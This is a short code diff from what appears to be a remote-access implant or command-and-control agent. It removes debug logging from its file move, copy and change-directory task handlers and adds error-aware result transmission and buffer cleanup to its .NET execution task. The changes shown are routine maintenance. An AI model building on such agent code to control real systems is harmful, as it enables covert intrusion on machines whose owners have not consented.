@@ -295,8 +295,6 @@ auto DECLFN Task::FileSystem(
             PCHAR SrcFile = Kh->Psr->GetStr( Parser, &TmpVal );
             PCHAR DstFile = Kh->Psr->GetStr( Parser, &TmpVal );
 
-            KhDbg( "src %s dst %s", SrcFile, DstFile );
-
             Success = Kh->Krnl32.MoveFileA( SrcFile, DstFile ); 
 
             break;
@@ -304,8 +302,6 @@ auto DECLFN Task::FileSystem(
         case SbFsCopy: {
             PCHAR SrcFile = Kh->Psr->GetStr( Parser, &TmpVal );
             PCHAR DstFile = Kh->Psr->GetStr( Parser, &TmpVal );
-
-            KhDbg( "src %s dst %s", SrcFile, DstFile );
 
             Success = Kh->Krnl32.CopyFileA( SrcFile, DstFile, TRUE );
 
@@ -327,8 +323,6 @@ auto DECLFN Task::FileSystem(
         }
         case SbFsChangeDir: {
             PCHAR PathName = Kh->Psr->GetStr( Parser, &TmpVal );
-
-            KhDbg( "Path to change directory", PathName );
 
             Success = Kh->Krnl32.SetCurrentDirectoryA( PathName );
 
@@ -408,7 +402,12 @@ auto DECLFN Task::Dotnet(
        }
     }   
 
-    Kh->Pkg->Transmit( Package, 0, 0 );
+_KH_END:
+    if ( !Code ) Kh->Pkg->Transmit( Package, 0, 0 );
+
+    if ( Kh->Dot->Buffer.a ) {
+        Kh->Hp->Free( Kh->Dot->Buffer.a, Kh->Dot->Buffer.s );
+    }
 
     return Code;
 }
